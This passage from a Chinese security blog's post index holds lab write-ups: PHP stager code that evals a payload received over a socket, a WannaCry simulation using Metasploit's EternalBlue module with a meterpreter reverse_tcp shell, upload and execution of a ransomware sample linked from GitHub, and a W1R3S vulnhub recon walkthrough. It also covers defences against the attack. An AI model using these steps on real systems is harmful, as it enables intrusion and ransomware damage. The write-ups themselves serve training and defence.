class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; <span class="keyword">die</span>(); &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;Nlen&quot;</span>, <span class="variable">$len</span>);</span><br><span class="line"><span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$s_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>:</span><br><span class="line">            <span class="variable">$b</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$s</span>, <span class="variable">$len</span>-<span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>:</span><br><span class="line">            <span class="variable">$b</span> .= <span class="title function_ invoke__">socket_read</span>(<span class="variable">$s</span>, <span class="variable">$len</span>-<span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123;</span><br><span class="line">    <span class="variable">$suhosin_bypass</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$suhosin_bypass</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量<code>$b</code>用于存储远程执行的命令</p><p>根据服务器环境的不同（是否安装了<code>suhosin</code>扩展，以及是否禁用了<code>eval</code>），这段PHP代码采取不同的方式来执行接收到的命令</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>谈到本次实验的收获，首先是要认识到，<strong>服务器开启日志记录很有必要</strong>，很多攻击可以从这些日志中溯源，进而还原攻击者的攻击链</p><p>当然，现实场景下，日志中的攻击痕迹不会这么容易就找到，很多情况下日志里记录了一天甚至是一周时间中服务器上发生的事情，想一条一条去分析无疑是大海捞针</p><p>这个时候就需要运维人员<strong>掌握一些攻击方式产生的日志的特征</strong>。例如本次实验中的SQL盲注产生的日志，攻击者发送的SQL语句涉及到了LENGTH()长度函数和用于获取字符ASCII码的ORD()函数，同时还进行大量比对操作。这些SQL语句很少会在日常使用数据库中出现，所以可以看作攻击的特征</p><p>而且，凡事要看它的两面性。有盾就有矛，<strong>通过日志分析一些渗透工具的攻击逻辑</strong>能够更好地掌握安全知识。例如SQL盲注中使用二分法可以更加高效，以后如果安全岗面试官让你手写一个SQL盲注工具的代码，异或是攻防比赛中限制使用工具，这些分析日志时总结的知识点都会让自己受益。</p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> Web </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勒索病毒模拟演练</title>
      <link href="/posts/4706558f9496/"/>
      <url>/posts/4706558f9496/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><div class="note info flat"><p><strong>永恒之蓝</strong>是一个利用Windows系统中Server Message Block (SMB) 协议的漏洞（MS17-010）进行攻击的高级漏洞利用工具。该漏洞允许攻击者在未授权的情况下远程执行代码，是由美国国家安全局（NSA）开发，并在2017年4月被黑客组织“影子经纪人”（Shadow Brokers）泄露。</p></div><p>永恒之蓝通过发送特制的数据包到目标计算机的445端口（SMB服务），利用SMB v1协议的缺陷，远程执行攻击者指定的代码。由于SMB服务在许多Windows系统中默认启用且常开放于网络，这使得永恒之蓝成为一个非常有效的网络渗透工具。</p><p>在漏洞被发现时，以下Windows系统版本被认为是易受攻击的：</p><ul><li>Windows Vista</li><li>Windows 7</li><li>Windows 8</li><li>Windows 8.1</li><li>Windows 10</li><li>Windows Server 2008, 2008 R2</li><li>Windows Server 2012, 2012 R2</li><li>Windows Server 2016</li></ul><p>不过，只要上述系统及时安装了微软发布的安全补丁（KB4013389），就可以抵御”永恒之蓝”攻击。</p><h3 id="WannaCry"><a href="#WannaCry" class="headerlink" title="WannaCry"></a>WannaCry</h3><div class="note info flat"><p><strong>WannaCry</strong>是一种勒索软件，于2017年5月对全球范围内的计算机发起了广泛的攻击。它主要通过永恒之蓝漏洞传播，一旦感染，就会加密计算机上的文件，并要求受害者支付比特币赎金以获取解密密钥。</p></div><p>WannaCry勒索软件结合了网络蠕虫功能，使其能够自动在网络上搜索存在MS17-010漏洞的计算机，并利用该漏洞传播和执行。它首先尝试连接到一个特定的域名，如果连接失败，意味着系统尚未感染，随后便开始加密过程，并显示赎金要求。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="WIn7虚拟机（靶机）"><a href="#WIn7虚拟机（靶机）" class="headerlink" title="WIn7虚拟机（靶机）"></a>WIn7虚拟机（靶机）</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>进入控制面板，点击<strong>系统和安全</strong></p><img src="/posts/4706558f9496/image-20240327084304834.png" class="" title="image-20240327084304834"><p>点击Windows防火墙</p><img src="/posts/4706558f9496/image-20240327084440351.png" class="" title="image-20240327084440351"><p>点击左侧的<strong>打开或关闭Windows防火墙</strong></p><img src="/posts/4706558f9496/image-20240327084550937.png" class="" title="image-20240327084550937"><p>选择关闭防火墙</p><img src="/posts/4706558f9496/image-20240327084710006.png" class="" title="image-20240327084710006"><p>成功关闭后显示如下</p><img src="/posts/4706558f9496/image-20240327084837987.png" class="" title="image-20240327084837987"><h4 id="准备各类型文件"><a href="#准备各类型文件" class="headerlink" title="准备各类型文件"></a>准备各类型文件</h4><p>为了测试出<code>WannaCry</code>的攻击效果，我们可以在Windows 7上准备一些文档资料，文档后缀类型包括txt、doc(x)、ppt(x)、tex、xls (x)、c、pdf、py、zip、rar、jp (e) g、mp3和avi等等，文件内容使用单词或者数字等进行填充，且生成不同的文件大小。为了模拟真实环境，文件路径可以在分析环境中设置一些真实用户使用的目录名称，例如在“我的文档”路径下创建文档文件，且用户文件的路径长度也是不确定的，每个文件夹可能包含一组子文件夹。</p><img src="/posts/4706558f9496/image-20240327104036322.webp" class="" title="image-20240327104036322"><h4 id="安装PCHunter"><a href="#安装PCHunter" class="headerlink" title="安装PCHunter"></a>安装PCHunter</h4><p>百度一下就能找到资源</p><img src="/posts/4706558f9496/image-20240327124447145.png" class="" title="image-20240327124447145"><h3 id="kali虚拟机（攻击机）"><a href="#kali虚拟机（攻击机）" class="headerlink" title="kali虚拟机（攻击机）"></a>kali虚拟机（攻击机）</h3><h4 id="准备病毒样本"><a href="#准备病毒样本" class="headerlink" title="准备病毒样本"></a>准备病毒样本</h4><p>使用kali自带的火绒浏览器访问wannacry样本的下载地址</p><p><a href="https://github.com/limiteci/WannaCry">https://github.com/limiteci/WannaCry</a></p><p>WannaCry的可执行文件形式无法在kali上直接运行，所以直接解压出来放在桌面即可</p><img src="/posts/4706558f9496/image-20240327093238818.webp" class="" title="image-20240327093238818"><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>在攻击机上使用nmap扫描工具对靶机进行端口扫描，验证靶机是否开启了445端口</p><p>执行指令<code>nmap -sT ip</code></p><img src="/posts/4706558f9496/image-20240327085226568.webp" class="" title="image-20240327085226568"><p>观察结果可知，win7靶机的445端口有开启</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>既然确认了靶机的445端口有开启，那么该靶机就有可能存在MS17-010漏洞，如果它没有安装相应安全补丁</p><p>我们可以利用命令<code>nmap -p- -sV --version-all --script vuln ip</code>扫描靶机存在的漏洞</p><p>我来解释一下使用的参数和选项：</p><ul><li><code>-p-</code>：指定扫描所有65535个TCP端口。默认情况下，nmap只扫描常见的端口，此选项使其扫描全部端口。</li><li><code>-sV</code>：启用服务版本探测。这个选项会尝试确定每个开放端口上运行的服务的名称和版本。</li><li><code>--version-all</code>：这是<code>-sV</code>选项的一个参数，指示nmap使用所有可能的探测尝试来确定服务版本。这可以提高识别服务的准确性，但会增加扫描时间。</li><li><code>--script vuln</code>：指示nmap执行其脚本库（NSE：Nmap Scripting Engine）中与“vuln”相关的所有脚本。这些脚本旨在发现目标可能存在的各种已知漏洞。</li></ul><img src="/posts/4706558f9496/image-20240327091254135.webp" class="" title="image-20240327091254135"><p>成功扫出MS17-010漏洞，说明靶机具备WannaCry感染条件</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>本次实验需要用到kali中的工具msfconsole</p><div class="note info flat"><ul><li><strong>Metasploit Framework</strong> 是一个渗透测试和安全漏洞研究工具，包含了大量的利用代码、辅助模块、有效载荷和监听器。它可以用来发现系统漏洞、测试网络的安全防护措施、执行后渗透活动等。</li><li><strong>msfconsole</strong> 是Metasploit Framework中的主要交互式接口。它提供了丰富的命令集和完整的控制环境，用于搜索、测试、执行漏洞利用和管理有效载荷。</li></ul></div><p>执行<code>msfconsole</code>命令打开msf的交互接口</p><img src="/posts/4706558f9496/image-20240327105355958.webp" class="" title="image-20240327105355958"><p>在交互窗口中执行命令<code>use exploit/windows/smb/ms17_010_eternalblue</code>，利用永恒之蓝MS17-010漏洞</p><img src="/posts/4706558f9496/image-20240327105556575.webp" class="" title="image-20240327105556575"><p>此时提示信息中有<code>exploit(windows/smb/ms17_010_eternalblue)</code>的字样</p><p>此时我们需要先设置靶机IP和攻击机IP</p><img src="/posts/4706558f9496/image-20240327110459785.png" class="" title="image-20240327110459785"><p>lhost为攻击机IP，而rhost则是靶机IP</p><p>执行<code>set payload windows/x64/meterpreter/reverse_tcp</code>命令，使用<code>meterpreter</code>编写的TCP反弹连接木马，用于在渗透成功后向攻击机发起连接请求进一步控制靶机的模块</p><img src="/posts/4706558f9496/image-20240327111548266.png" class="" title="image-20240327111548266"><h2 id="渗透及远程命令执行"><a href="#渗透及远程命令执行" class="headerlink" title="渗透及远程命令执行"></a>渗透及远程命令执行</h2><p>在开始渗透前可以打开wireshark捕获数据包，来观察渗透过程</p><p>执行<code>exploit</code>开始渗透</p><img src="/posts/4706558f9496/image-20240327111818661.png" class="" title="image-20240327111818661"><p>显示<code>WIN</code>则说明渗透成功</p><p>使用<code>ip.dst==172.29.65.64 &amp;&amp; tcp.port==445</code>筛选出向靶机445端口发送payload的数据包</p><p>我们可以观察到明显的payload特征，即连续的字符A</p><img src="/posts/4706558f9496/image-20240327114723600.png" class="" title="image-20240327114723600"><p>接下来我们开始远程命令执行，首先将攻击机上的Wannacry病毒样本传到靶机上</p><p>执行<code>upload /home/kali/Desktop/WannaCry.EXE C:\\WannaCry.exe</code></p><p>在上传命令中我们顺便将后缀改为可执行文件的exe</p><img src="/posts/4706558f9496/image-20240327112433755.png" class="" title="image-20240327112433755"><p>此时我们可以打开靶机的C盘验证文件是否上传成功</p><img src="/posts/4706558f9496/image-20240327122457422.png" class="" title="image-20240327122457422"><p>再次筛选捕获到的数据包</p><img src="/posts/4706558f9496/image-20240327122322810.png" class="" title="image-20240327122322810"><p>可以发现攻击机通过靶机的49163端口使用tcp包上传了病毒样本</p><p>执行命令<code>execute -f C:\\WannaCry.exe</code>，让靶机远程运行勒索病毒样本</p><img src="/posts/4706558f9496/image-20240327125836872.png" class="" title="image-20240327125836872"><p>攻击机显示勒索病毒在靶机上的进程号为2832</p><h2 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h2><h3 id="病毒特征"><a href="#病毒特征" class="headerlink" title="病毒特征"></a>病毒特征</h3><p>进入靶机查看，发现桌面壁纸被更改，且跳出打款弹窗</p><img src="/posts/4706558f9496/image-20240327125934011.png" class="" title="image-20240327125934011"><p>查看之前准备的各类型文档，可以发现后缀名后都被加上了<code>.WNCRY</code></p><img src="/posts/4706558f9496/image-20240327130216945.png" class="" title="image-20240327130216945"><p>每个目录下还出现了readme文档和解密程序</p><p>用记事本打开文件，可以发现文件内容也被加密</p><img src="/posts/4706558f9496/image-20240327130612604.png" class="" title="image-20240327130612604"><p>不过部分病毒没有识别出类型的文档，例如<code>docx</code>没有被加密</p><img src="/posts/4706558f9496/image-20240327130805265.png" class="" title="image-20240327130805265"><p>虽然该文件之前是因为粗心将<code>docx</code>打成了<code>docs</code>，但这也说明WannaCry病毒不会加密识别不出类型的文档</p><h3 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h3><p>在靶机命令行执行netstat查看网络连接状态，可以找到和攻击机之间的连接，以及靶机被占用的455</p><img src="/posts/4706558f9496/image-20240327132033411.png" class="" title="image-20240327132033411"><h3 id="观察启动项"><a href="#观察启动项" class="headerlink" title="观察启动项"></a>观察启动项</h3><p>在搜索栏输入msconfig，找到对应程序并执行</p><p>点击<strong>启动</strong>栏，发现可疑的启动项</p><img src="/posts/4706558f9496/image-20240327132634263.png" class="" title="image-20240327132634263"><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p>将Window7的快照回退到攻击前</p><p>检查防火墙是否开启，若关闭则开启防火墙</p><img src="/posts/4706558f9496/image-20240327134938433.png" class="" title="image-20240327134938433"><p>点击左侧的<strong>高级设置</strong>，然后点击<strong>入站规则</strong></p><img src="/posts/4706558f9496/image-20240327135408549.png" class="" title="image-20240327135408549"><p>点击操作菜单中的<strong>新建规则…</strong></p><p>在规则类型中选择“端口”，点击“下一步”</p><img src="/posts/4706558f9496/image-20240327135452127.png" class="" title="image-20240327135452127"><p>选择TCP，并在特定本地端口中输入<code>445</code>，然后点击下一步。</p><img src="/posts/4706558f9496/image-20240327141836189.png" class="" title="image-20240327141836189"><p>选择“阻止连接”，点击“下一步”。</p><p>选择适用的配置文件（通常选择全部），然后点击“下一步”。</p><p>给规则命名“Block TCP 445”，点击“完成”。</p><img src="/posts/4706558f9496/image-20240327141956188.png" class="" title="image-20240327141956188"><p>此时端口445就被我们禁用了</p><h3 id="禁用SMBv1协议"><a href="#禁用SMBv1协议" class="headerlink" title="禁用SMBv1协议"></a>禁用SMBv1协议</h3><p>关闭445端口可能会影响网络文件和打印机共享的功能，我们也可以通过禁用SMBv1来防御WannaCry</p><p>WannaCry和其他一些恶意软件是通过利用SMBv1中的漏洞来传播</p><p>首先在桌面按下“win+R”打开“运行”窗口，输入“regedit”并点击“确定”打开注册表；</p><p>进入注册表编辑器窗口后，在左侧依次展开<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters</code>；</p><img src="/posts/4706558f9496/image-20240327143309844.png" class="" title="image-20240327143309844"><p>在“Parameters”项右键，在弹出的菜单中选择“新建—DWORD（32位）值”，将其命名为“SMB1”即可。</p><img src="/posts/4706558f9496/image-20240327143344975.png" class="" title="image-20240327143344975"><h3 id="验证防御效果"><a href="#验证防御效果" class="headerlink" title="验证防御效果"></a>验证防御效果</h3><p>再次使用kali攻击机重复渗透的步骤，发现执行<code>exploit</code>后漏洞利用失败</p><img src="/posts/4706558f9496/image-20240327143701844.png" class="" title="image-20240327143701844">]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> kali </tag>
            
            <tag> virus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W1R3S 1.01打靶复现</title>
      <link href="/posts/46fa4fea2ae0/"/>
      <url>/posts/46fa4fea2ae0/</url>
      
        <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/Bossfrank/article/details/130953265">红队打靶：W1R3S: 1.0.1详细打靶思路（vulnhub）_w1r3s 1.0.1-CSDN博客</a></p><p><a href="https://www.bilibili.com/video/BV1mB4y1j7K6/?vd_source=554a22bb3021b3d43c5adf0f5628571e">「红队笔记」靶机精讲：W1R3S 1.0.1 - 渗透测试思路为王，细节多到即使对于纯萌新也能无感入圈。_哔哩哔哩_bilibili</a></p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>靶机选择NAT连接，攻击机kali虚拟机的网络连接方式选择桥接</p><p>执行<code>ip a</code>查看kali攻击机的ip</p><img src="/posts/46fa4fea2ae0/image-20240421200521057.webp" class="" title="image-20240421200521057"><p>kali的ip为<code>192.168.43.168</code>，所在网段为<code>192.168.43.0/24</code></p><p>使用nmap扫描该网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.43.0/24</span><br></pre></td></tr></table></figure><p><code>-n</code>指no portscan，不进行端口只进行主机嗅探（ping扫描）</p><p><code>-sn</code>相比于广播查询更可靠（共发送四项数据来嗅探主机），尽量不要使用<code>-sP</code></p><p><strong>在靶机上线之前进行一次扫描，靶机上线之后再扫描一次，对比发现上线的主机，用于确认靶机的ip</strong></p><img src="/posts/46fa4fea2ae0/image-20240421201603198.webp" class="" title="image-20240421201603198"><p>将靶机上线后，重新扫描网段</p><img src="/posts/46fa4fea2ae0/image-20240421210947108.webp" class="" title="image-20240421210947108"><p>多出的这个IP<code>192.168.43.11</code>即为靶机的IP</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="粗略扫描"><a href="#粗略扫描" class="headerlink" title="粗略扫描"></a>粗略扫描</h3><p>可以建一个文件夹用于保存扫描结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nmapscan</span><br></pre></td></tr></table></figure><p>使用nmap对找到的靶机进行端口扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 192.168.43.11 -oA nmapscan/ports</span><br></pre></td></tr></table></figure><p><code>--min-rate</code>参数设小一些（10000以内）是为了防止被判定为恶意扫描</p><p><code>-p-</code>即指定扫描全端口</p><p><code>-oA</code>输出nmap的扫描结果到三种不同格式的扫描日志文件中</p><p>我们还可以指定探测方法，例如<code>-sS</code>和<code>-sT</code></p><ol><li><p><strong>TCP SYN扫描（-sS）</strong>:</p><p>这是一种半开放扫描技术，常被称为”<strong>隐形扫描</strong>“，因为它不会建立一个完整的TCP连接。</p><p>在这种扫描中，Nmap发送一个TCP SYN包（连接请求）到目标端口。如果目标端口是开放的，目标机器会回应一个SYN-ACK包（同意连接）。此时，Nmap 不会发送最后的ACK包来完成三次握手过程，而是发送一个RST包（重置），这样就避免了在目标系统上完成TCP连接的记录。</p><p>这种扫描方法相对不易被防火墙或入侵检测系统所发现。</p></li><li><p><strong>TCP connect()扫描（-sT）</strong>:</p><p>这种扫描实际上使用操作系统的connect()函数来尝试打开到目标机器的TCP连接。</p><p>如果端口开放，操作系统完成TCP三次握手过程，并建立一个完整的连接，然后Nmap发送一个RST包来关闭连接。这种扫描方法<strong>容易被系统的日志记录及安全系统发现</strong>。</p><p>当然这种方式探测端口时更加准确，不容易漏扫端口</p></li></ol><img src="/posts/46fa4fea2ae0/image-20240421213712366.webp" class="" title="image-20240421213712366"><p>一共扫描到了4个端口</p><p>执行<code>cat nmapscan/ports.xml</code>查看详细扫描结果</p><p>当然实际渗透测试过程中，由于目标主机被扫到的端口可能较多，即使是<code>ports.nmap</code>中，扫描结果也会非常繁杂</p><p>而我们只希望了解开放的端口，所有可以用<code>grep</code>指令过滤一下输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240421214257401.webp" class="" title="image-20240421214257401"><p>当然后续详细信息扫描时，我们可能会经常要用到之前扫到的端口</p><p>所以可以通过将扫到的端口整理一下，用逗号分隔后指定为系统变量，方便后续随时调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap | awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)</span><br><span class="line">echo $ports</span><br></pre></td></tr></table></figure><ol><li><strong><code>awk -F&#39;/&#39; &#39;&#123;print $1&#125;&#39;</code></strong>:<ul><li><code>awk</code>是一个强大的文本处理工具，这里它用来处理通过<code>grep</code>筛选得到的每一行。</li><li><code>-F&#39;/&#39;</code>设置字段分隔符为斜杠（<code>/</code>），这意味着<code>awk</code>会将每行数据按照斜杠分割成多个字段。</li><li><code>&#39;&#123;print $1&#125;&#39;</code>指示<code>awk</code>打印每行的第一个字段，对于Nmap的输出来说，通常第一个字段是端口号。</li></ul></li><li><strong><code>paste -sd &#39;,&#39;</code></strong>:<ul><li><code>paste</code>命令用于合并来自标准输入（stdin）的行。</li><li><code>-sd &#39;,&#39;</code>参数中的<code>-s</code>选项告诉<code>paste</code>将所有输入行串联到一行中，而<code>-d &#39;,&#39;</code>设置字段分隔符为逗号（<code>,</code>）。这样，所有从<code>awk</code>输出的端口号都会被合并成一个由逗号分隔的单行字符串。</li></ul></li></ol><img src="/posts/46fa4fea2ae0/image-20240421214839149.webp" class="" title="image-20240421214839149"><h3 id="详细扫描"><a href="#详细扫描" class="headerlink" title="详细扫描"></a>详细扫描</h3><p>接下来我们扫描具体的端口服务和操作系统版本等信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p $ports 192.168.43.11 -oA nmapscan/detail</span><br></pre></td></tr></table></figure><ol><li><p><strong><code>-sV</code></strong>:</p><p>服务版本探测，这个选项让Nmap尝试确定目标端口上运行的应用程序及其版本信息。它通过发送特定的数据包序列到各个端口，然后分析响应来实现。</p></li><li><p><strong><code>-sC</code></strong>:</p><p>默认脚本扫描，这相当于执行<code>--script=default</code>。Nmap有一套脚本库（NSE: Nmap Scripting Engine），这些脚本用于执行更广泛的探测，如常见漏洞扫描、额外的服务信息获取等。</p></li><li><p><strong><code>-O</code></strong>:</p><p>操作系统检测，通过分析目标主机返回的数据包的特征（如TCP窗口大小、TTL值等），Nmap试图推测目标操作系统的类型和版本。</p></li></ol><p>此时我们就能体会到<strong>分阶段扫描的重要性</strong>：虽然上面的指令使用了<code>-sV</code> 、<code>-sC</code> 、<code>-O</code>等参数探测了较多信息，属于动静很大的攻击了，但是由于上一步我们把端口范围缩小，所以总体而言还是比较隐蔽的。如果一上来就对65536个端口（全端口）进行全面扫描，那么暴露的概率就会非常大</p><img src="/posts/46fa4fea2ae0/image-20240421223434495.webp" class="" title="image-20240421223434495"><p>扫出来的详细服务信息如上图，而<code>-O</code>的扫描结果则给了一些系统信息的推测范围</p><img src="/posts/46fa4fea2ae0/image-20240421223701648.webp" class="" title="image-20240421223701648"><p>这些端口中的漏洞为我们提供了不同的攻击向量，在攻击时我们可以组合运用，或者在没思路地时候切换攻击向量</p><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p>紧接着我们再进行UDP扫描，保证没有遗漏的端口信息。<strong>虽然UDP端口暴露的攻击面是比较小的，但在信息搜集阶段就应该搜集较全的信息，当TCP端口没有找到突破口的时候，说不定UDP也是一条路</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 192.168.43.11 -oA nmapscan/udp</span><br></pre></td></tr></table></figure><p>这里只扫描20个最热门的UDP端口，由于udp的协议优势，扫描速度会非常快</p><img src="/posts/46fa4fea2ae0/image-20240421224145811.webp" class="" title="image-20240421224145811"><p>当然UDP扫描得到的端口可以作为备用资源，当无法从TCP端口中找到有用信息时，不妨关注一下开放的UDP端口</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p> —script=vuln表示使用nmap中自带的脚本vuln进行漏洞扫描。该脚本会对端口的历史常见漏洞进行扫描探测，如果这一步就能发现可利用的漏洞，对后续的操作会很有启发。</p><p>vuln是vulnrability的缩写，这个脚本由官方不断地维护更新。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -script=vuln -p $ports 192.168.43.11 -oA nmapscan/vuln</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240421231510536.webp" class="" title="image-20240421231510536"><p>并没有发现更多新漏洞，而提示的DOS攻击在实战中基本不会用到</p><h2 id="FTP渗透"><a href="#FTP渗透" class="headerlink" title="FTP渗透"></a>FTP渗透</h2><p>使用<code>ftp</code>命令连接到靶机的ftp服务，使用匿名登录，密码为空</p><p><style>.dflvcmubgsio{zoom:200%;}</style><img src="/posts/46fa4fea2ae0/image-20240421232023288.webp" class="dflvcmubgsio" alt="image-20240421232023288"></p><div class="note warning flat"><p>此处我们最好先切到二进制模式，这是一个好习惯，防止后续从靶机下载的可执行文件无法执行</p><p><img src="/posts/46fa4fea2ae0/image-20240421232321117.webp" class="" title="image-20240421232321117"></p></div><p>执行<code>ls</code>查看目录下的文件</p><img src="/posts/46fa4fea2ae0/image-20240421232432158.webp" class="" title="image-20240421232432158"><p>一共三个目录，先进入content查看</p><img src="/posts/46fa4fea2ae0/image-20240421232533736.webp" class="" title="image-20240421232533736"><p>存在三个可读文件，我们将其下载下来（使用<code>prompt</code>关闭交互的提示信息）</p><img src="/posts/46fa4fea2ae0/image-20240421232734551.webp" class="" title="image-20240421232734551"><p>继续下载其他目录下的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ../docs</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240421232838528.webp" class="" title="image-20240421232838528"><p>将该目录下的<code>worktodo.txt</code>文件也下载下来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get worktodo.txt</span><br></pre></td></tr></table></figure><p>第三个目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ../new-employees</span><br><span class="line">ls</span><br><span class="line">get employee-names</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240421233047244.webp" class="" title="image-20240421233047244"><p>在获得泄漏文件后，FTP服务就可以退出了</p><p>一次性查看所有文件<code>cat *.txt</code></p><img src="/posts/46fa4fea2ae0/image-20240421233900816.webp" class="" title="image-20240421233900816"><p>前几个文件提供了两个编码，第二个能一眼看出是base64编码，而第一个则可能是某种哈希值</p><p>将第一个编码丢给<code>hash-identifier</code></p><img src="/posts/46fa4fea2ae0/image-20240421234039290.webp" class="" title="image-20240421234039290"><p>提示最有可能是md5编码</p><p>丢给在线网站破解<a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></p><img src="/posts/46fa4fea2ae0/image-20240421234503621.webp" class="" title="image-20240421234503621"><p>明文<code>This is not a password</code>，是无效信息</p><p>解码base64</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27; | base64 –d</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240421234655352.webp" class="" title="image-20240421234655352"><p>仍然是无效信息</p><img src="/posts/46fa4fea2ae0/image-20240421234807504.webp" class="" title="image-20240421234807504"><p>看到员工列表，这是较为有用的信息。</p><p>针对每个人的名字和职位，我们就可以做针对性的渗透。比方说经理Naomi的权限说不定会更高，Web Design网页设计者可能在web开发中有一些自己的习惯。HR是我们社工的主要对象等等</p><h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><p>浏览器访问一下靶机在80端口上开 的web服务</p><img src="/posts/46fa4fea2ae0/image-20240422004253217.webp" class="" 